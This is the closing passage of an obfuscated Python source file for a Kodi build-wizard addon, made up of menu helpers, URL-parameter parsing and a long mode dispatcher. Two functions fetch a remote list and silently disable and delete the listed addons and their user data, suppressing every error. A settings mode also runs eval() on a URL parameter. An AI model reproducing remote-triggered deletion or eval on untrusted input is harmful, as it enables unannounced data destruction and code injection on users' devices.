	O0O0O0O0O0OO0OO00 =xbmcgui .ListItem (OOOOO000OOOOOO000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6166
	O0O0O0O0O0OO0OO00 .setInfo (type ="Video",infoLabels ={"Title":OOOOO000OOOOOO000 ,"Plot":description })#line:6167
	O0O0O0O0O0OO0OO00 .setProperty ("Fanart_Image",fanart )#line:6168
	if not menu ==None :O0O0O0O0O0OO0OO00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6169
	OOOO0OO00O00O0OO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0OO0000O00OOO00 ,listitem =O0O0O0O0O0OO0OO00 ,isFolder =True )#line:6170
	return OOOO0OO00O00O0OO0 #line:6171
def addFile (O00O00O0O0O0000OO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6173
	OOO0O000OOOO00O0O =sys .argv [0 ]#line:6174
	if not mode ==None :OOO0O000OOOO00O0O +="?mode=%s"%urllib .quote_plus (mode )#line:6175
	if not name ==None :OOO0O000OOOO00O0O +="&name="+urllib .quote_plus (name )#line:6176
	if not url ==None :OOO0O000OOOO00O0O +="&url="+urllib .quote_plus (url )#line:6177
	O0OOOO0O00O0OO00O =True #line:6178
	if themeit :O00O00O0O0O0000OO =themeit %O00O00O0O0O0000OO #line:6179
	OO0O0000O00OO000O =xbmcgui .ListItem (O00O00O0O0O0000OO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6180
	OO0O0000O00OO000O .setInfo (type ="Video",infoLabels ={"Title":O00O00O0O0O0000OO ,"Plot":description })#line:6181
	OO0O0000O00OO000O .setProperty ("Fanart_Image",fanart )#line:6182
	if not menu ==None :OO0O0000O00OO000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:6183
	O0OOOO0O00O0OO00O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0O000OOOO00O0O ,listitem =OO0O0000O00OO000O ,isFolder =False )#line:6184
	return O0OOOO0O00O0OO00O #line:6185
def get_params ():#line:6187
	OO00OO000O00O00O0 =[]#line:6188
	O0O0O00000O000O0O =sys .argv [2 ]#line:6189
	if len (O0O0O00000O000O0O )>=2 :#line:6190
		OO0O00000OOO00O0O =sys .argv [2 ]#line:6191
		O0O000O0OOO0O0OOO =OO0O00000OOO00O0O .replace ('?','')#line:6192
		if (OO0O00000OOO00O0O [len (OO0O00000OOO00O0O )-1 ]=='/'):#line:6193
			OO0O00000OOO00O0O =OO0O00000OOO00O0O [0 :len (OO0O00000OOO00O0O )-2 ]#line:6194
		OO0OOO0O0OOO0O00O =O0O000O0OOO0O0OOO .split ('&')#line:6195
		OO00OO000O00O00O0 ={}#line:6196
		for OOOOO0000OOO0O0O0 in range (len (OO0OOO0O0OOO0O00O )):#line:6197
			O0000OOO0OO0000OO ={}#line:6198
			O0000OOO0OO0000OO =OO0OOO0O0OOO0O00O [OOOOO0000OOO0O0O0 ].split ('=')#line:6199
			if (len (O0000OOO0OO0000OO ))==2 :#line:6200
				OO00OO000O00O00O0 [O0000OOO0OO0000OO [0 ]]=O0000OOO0OO0000OO [1 ]#line:6201
		return OO00OO000O00O00O0 #line:6203
def remove_addons ():#line:6205
	try :#line:6206
			import json #line:6207
			OOOOOO0O00OOO0O0O =urllib2 .urlopen (remove_url ).readlines ()#line:6208
			for OO0OO00OOOOOOO000 in OOOOOO0O00OOO0O0O :#line:6209
				O0O0OOO0OOO000000 =OO0OO00OOOOOOO000 .split (':')[1 ].strip ()#line:6211
				O0O0OO000O0000O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0O0OOO0OOO000000 ,'false')#line:6212
				OO00OOO000OOO0O00 =xbmc .executeJSONRPC (O0O0OO000O0000O00 )#line:6213
				OOOO00O00O00000OO =json .loads (OO00OOO000OOO0O00 )#line:6214
				O0OO00O0O000O00OO =os .path .join (addons_folder ,O0O0OOO0OOO000000 )#line:6216
				if os .path .exists (O0OO00O0O000O00OO ):#line:6218
					for OO000O0OO000OOO00 ,O00OOO0OO00000O0O ,O0OOO0O000OOO000O in os .walk (O0OO00O0O000O00OO ):#line:6219
						for OO0O00OO0000O0O0O in O0OOO0O000OOO000O :#line:6220
							os .unlink (os .path .join (OO000O0OO000OOO00 ,OO0O00OO0000O0O0O ))#line:6221
						for OO0O0O00OO000O0O0 in O00OOO0OO00000O0O :#line:6222
							shutil .rmtree (os .path .join (OO000O0OO000OOO00 ,OO0O0O00OO000O0O0 ))#line:6223
					os .rmdir (O0OO00O0O000O00OO )#line:6224
			xbmc .executebuiltin ('Container.Refresh')#line:6226
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6227
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6228
	except :pass #line:6229
def remove_addons2 ():#line:6230
	try :#line:6231
			import json #line:6232
			O000OO00O0OO0OO00 =urllib2 .urlopen (remove_url2 ).readlines ()#line:6233
			for O0OO0OOO00O0OO000 in O000OO00O0OO0OO00 :#line:6234
				O000O00O0OOOO0O0O =O0OO0OOO00O0OO000 .split (':')[1 ].strip ()#line:6236
				OO00O00O0OOOOO00O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O000O00O0OOOO0O0O ,'false')#line:6237
				O000O0OO00OO0OO0O =xbmc .executeJSONRPC (OO00O00O0OOOOO00O )#line:6238
				O0O00000OO00000OO =json .loads (O000O0OO00OO0OO0O )#line:6239
				OO0OOOOO000O00O00 =os .path .join (user_folder ,O000O00O0OOOO0O0O )#line:6241
				if os .path .exists (OO0OOOOO000O00O00 ):#line:6243
					for O00OO0O00OO0OOOO0 ,O0OO0OOO0000OOO0O ,O0000OO00O0O0OOO0 in os .walk (OO0OOOOO000O00O00 ):#line:6244
						for O00OO0O000O0OOO0O in O0000OO00O0O0OOO0 :#line:6245
							os .unlink (os .path .join (O00OO0O00OO0OOOO0 ,O00OO0O000O0OOO0O ))#line:6246
						for OO0OOOOOO0O0OO00O in O0OO0OOO0000OOO0O :#line:6247
							shutil .rmtree (os .path .join (O00OO0O00OO0OOOO0 ,OO0OOOOOO0O0OO00O ))#line:6248
					os .rmdir (OO0OOOOO000O00O00 )#line:6249
	except :pass #line:6251
params =get_params ()#line:6252
url =None #line:6253
name =None #line:6254
mode =None #line:6255
try :mode =urllib .unquote_plus (params ["mode"])#line:6257
except :pass #line:6258
try :name =urllib .unquote_plus (params ["name"])#line:6259
except :pass #line:6260
try :url =urllib .unquote_plus (params ["url"])#line:6261
except :pass #line:6262
def setView (O0O0O00O00OO0000O ,O000OO0OO000000OO ):#line:6266
	if wiz .getS ('auto-view')=='true':#line:6267
		OOOO00O0OO0O0OO00 =wiz .getS (O000OO0OO000000OO )#line:6268
		if OOOO00O0OO0O0OO00 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOO00O0OO0O0OO00 ='55'#line:6269
		if OOOO00O0OO0O0OO00 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOO00O0OO0O0OO00 ='50'#line:6270
		wiz .ebi ("Container.SetViewMode(%s)"%OOOO00O0OO0O0OO00 )#line:6271
if mode ==None :index ()#line:6273
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6275
elif mode =='builds':buildMenu ()#line:6276
elif mode =='viewbuild':viewBuild (name )#line:6277
elif mode =='buildinfo':buildInfo (name )#line:6278
elif mode =='buildpreview':buildVideo (name )#line:6279
elif mode =='install':buildWizard (name ,url )#line:6280
elif mode =='theme':buildWizard (name ,mode ,url )#line:6281
elif mode =='viewthirdparty':viewThirdList (name )#line:6282
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6283
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6284
elif mode =='maint':maintMenu (name )#line:6286
elif mode =='passpin':passandpin ()#line:6287
elif mode =='backmyupbuild':backmyupbuild ()#line:6288
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6289
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6290
elif mode =='advancedsetting':advancedWindow (name )#line:6291
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6292
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6293
elif mode =='asciicheck':wiz .asciiCheck ()#line:6294
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6295
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6296
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6297
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6298
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6299
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6300
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6301
elif mode =='currentsettings':viewAdvanced ()#line:6302
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6303
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6304
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6305
elif mode =='fixskin':backtokodi ()#line:6306
elif mode =='testcommand':updatetelemedia (NOTEID )#line:6307
elif mode =='logsend':logsend ()#line:6308
elif mode =='rdon':rdon ()#line:6309
elif mode =='rdoff':rdoff ()#line:6310
elif mode =='setrd':setrealdebrid ()#line:6311
elif mode =='setrd2':setautorealdebrid ()#line:6312
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6313
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6314
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6315
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6316
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6317
elif mode =='freshstart':freshStart ()#line:6318
elif mode =='forceupdate':wiz .forceUpdate ()#line:6319
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6320
elif mode =='forceclose':wiz .killxbmc ()#line:6321
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6322
elif mode =='hidepassword':wiz .hidePassword ()#line:6323
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6324
elif mode =='enableaddons':enableAddons ()#line:6325
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6326
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6327
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6328
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6329
elif mode =='uploadlog':uploadLog .Main ()#line:6330
elif mode =='viewlog':LogViewer ()#line:6331
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6332
elif mode =='viewerrorlog':errorChecking (all =True )#line:6333
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6334
elif mode =='purgedb':purgeDb ()#line:6335
elif mode =='fixaddonupdate':fixUpdate ()#line:6336
elif mode =='removeaddons':removeAddonMenu ()#line:6337
elif mode =='removeaddon':removeAddon (name )#line:6338
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6339
elif mode =='removedata':removeAddonData (name )#line:6340
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6341
elif mode =='systeminfo':systemInfo ()#line:6342
elif mode =='restorezip':restoreit ('build')#line:6343
elif mode =='restoregui':restoreit ('gui')#line:6344
elif mode =='restoreaddon':restoreit ('addondata')#line:6345
elif mode =='restoreextzip':restoreextit ('build')#line:6346
elif mode =='restoreextgui':restoreextit ('gui')#line:6347
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6348
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6349
elif mode =='traktsync':traktsync ()#line:6350
elif mode =='apk':apkMenu (name )#line:6352
elif mode =='apkscrape':apkScraper (name )#line:6353
elif mode =='apkinstall':apkInstaller (name ,url )#line:6354
elif mode =='speed':speedMenu ()#line:6355
elif mode =='net':net_tools ()#line:6356
elif mode =='GetList':GetList (url )#line:6357
elif mode =='youtube':youtubeMenu (name )#line:6358
elif mode =='viewVideo':playVideo (url )#line:6359
elif mode =='addons':addonMenu (name )#line:6361
elif mode =='addoninstall':addonInstaller (name ,url )#line:6362
elif mode =='savedata':saveMenu ()#line:6364
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6365
elif mode =='managedata':manageSaveData (name )#line:6366
elif mode =='whitelist':wiz .whiteList (name )#line:6367
elif mode =='trakt':traktMenu ()#line:6369
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6370
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6371
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6372
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6373
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6374
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6375
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6376
elif mode =='realdebrid':realMenu ()#line:6378
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6379
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6380
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6381
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6382
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6383
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6384
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6385
elif mode =='login':loginMenu ()#line:6387
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6388
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6389
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6390
elif mode =='clearlogin':loginit .clearSaved (name )#line:6391
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6392
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6393
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6394
elif mode =='contact':notify .contact (CONTACT )#line:6396
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6397
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6398
elif mode =='developer':developer ()#line:6400
elif mode =='converttext':wiz .convertText ()#line:6401
elif mode =='createqr':wiz .createQR ()#line:6402
elif mode =='testnotify':testnotify ()#line:6403
elif mode =='testnotify2':testnotify2 ()#line:6404
elif mode =='servicemanual':servicemanual ()#line:6405
elif mode =='fastinstall':fastinstall ()#line:6406
elif mode =='testupdate':testupdate ()#line:6407
elif mode =='testfirst':testfirst ()#line:6408
elif mode =='testfirstrun':testfirstRun ()#line:6409
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6410
elif mode =='bg':wiz .bg_install (name ,url )#line:6412
elif mode =='bgcustom':wiz .bg_custom ()#line:6413
elif mode =='bgremove':wiz .bg_remove ()#line:6414
elif mode =='bgdefault':wiz .bg_default ()#line:6415
elif mode =='rdset':rdsetup ()#line:6416
elif mode =='mor':morsetup ()#line:6417
elif mode =='mor2':morsetup2 ()#line:6418
elif mode =='resolveurl':resolveurlsetup ()#line:6419
elif mode =='urlresolver':urlresolversetup ()#line:6420
elif mode =='forcefastupdate':forcefastupdate ()#line:6421
elif mode =='traktset':traktsetup ()#line:6422
elif mode =='placentaset':placentasetup ()#line:6423
elif mode =='flixnetset':flixnetsetup ()#line:6424
elif mode =='reptiliaset':reptiliasetup ()#line:6425
elif mode =='yodasset':yodasetup ()#line:6426
elif mode =='numbersset':numberssetup ()#line:6427
elif mode =='uranusset':uranussetup ()#line:6428
elif mode =='genesisset':genesissetup ()#line:6429
elif mode =='fastupdate':fastupdate ()#line:6430
elif mode =='folderback':folderback ()#line:6431
elif mode =='menudata':Menu ()#line:6432
elif mode =='infoupdate':infobuild ()#line:6433
elif mode =='wait':wait ()#line:6434
elif mode ==2 :#line:6435
        wiz .torent_menu ()#line:6436
elif mode ==3 :#line:6437
        wiz .popcorn_menu ()#line:6438
elif mode ==8 :#line:6439
        wiz .metaliq_fix ()#line:6440
elif mode ==9 :#line:6441
        wiz .quasar_menu ()#line:6442
elif mode ==5 :#line:6443
        swapSkins ('skin.Premium.mod')#line:6444
elif mode ==13 :#line:6445
        wiz .elementum_menu ()#line:6446
elif mode ==16 :#line:6447
        wiz .fix_wizard ()#line:6448
elif mode ==17 :#line:6449
        wiz .last_play ()#line:6450
elif mode ==18 :#line:6451
        wiz .normal_metalliq ()#line:6452
elif mode ==19 :#line:6453
        wiz .fast_metalliq ()#line:6454
elif mode ==20 :#line:6455
        wiz .fix_buffer2 ()#line:6456
elif mode ==21 :#line:6457
        wiz .fix_buffer3 ()#line:6458
elif mode ==11 :#line:6459
        wiz .fix_buffer ()#line:6460
elif mode ==15 :#line:6461
        wiz .fix_font ()#line:6462
elif mode ==14 :#line:6463
        wiz .clean_pass ()#line:6464
elif mode ==22 :#line:6465
        wiz .movie_update ()#line:6466
elif mode =='simpleiptv':#line:6469
    DIALOG =xbmcgui .Dialog ()#line:6471
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6472
    if choice ==1 :#line:6473
        iptvkodi17_18 ()#line:6474
    else :#line:6476
     sys .exit ()#line:6477
elif mode =='simpleidanplus':#line:6479
    DIALOG =xbmcgui .Dialog ()#line:6480
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6481
    if choice ==1 :#line:6482
        iptvidanplus ()#line:6483
    else :#line:6485
     sys .exit ()#line:6486
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6488
elif mode =='adv_settings':buffer1 ()#line:6489
elif mode =='getpass':getpass ()#line:6490
elif mode =='setpass':setpass ()#line:6491
elif mode =='setuname':setuname ()#line:6492
elif mode =='passandUsername':passandUsername ()#line:6493
elif mode =='9':disply_hwr ()#line:6494
elif mode =='99':disply_hwr2 ()#line:6495
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))